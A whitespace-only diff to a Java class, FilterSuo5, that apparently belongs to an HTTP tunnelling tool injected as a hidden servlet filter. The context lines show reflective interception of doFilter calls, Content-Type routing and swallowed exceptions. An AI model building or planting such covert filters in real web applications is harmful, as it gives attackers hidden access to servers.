@@ -40,7 +40,6 @@ public class FilterSuo5 implements InvocationHandler, Runnable, HostnameVerifier
         this.gOutStream = out;
     }
 
-
     public Object invoke(Object proxy, Method method, Object[] args) {
         if (method.getName().equals("doFilter")) {
             task(args[0], args[1], args[2]);
@@ -59,7 +58,6 @@ public class FilterSuo5 implements InvocationHandler, Runnable, HostnameVerifier
             }
 
             String contentType = (String) invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{"Content-Type"});
-
             if (contentType == null) {
                 return;
             }
@@ -74,7 +72,6 @@ public class FilterSuo5 implements InvocationHandler, Runnable, HostnameVerifier
             } else {
                 processDataUnary(request, response);
             }
-
 
         } catch (Throwable e) {
         }
